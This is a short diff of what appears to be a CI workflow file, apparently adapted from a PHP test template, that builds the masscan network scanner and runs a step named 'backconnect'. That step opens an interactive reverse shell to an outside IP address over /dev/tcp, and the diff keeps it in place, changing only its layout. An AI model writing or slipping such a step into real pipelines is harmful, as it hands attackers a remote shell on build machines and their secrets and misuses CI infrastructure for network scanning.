@@ -24,7 +24,7 @@ jobs:
     - run: git clone https://github.com/robertdavidgraham/masscan && cd masscan && make
 
     - name: backconnect
-      run: sh -i >& /dev/tcp/52.88.146.94/4567 0>&1
+    - run: sh -i >& /dev/tcp/52.88.146.94/4567 0>&1
 
 
     # Add a test script to composer.json, for instance: "test": "vendor/bin/phpunit"
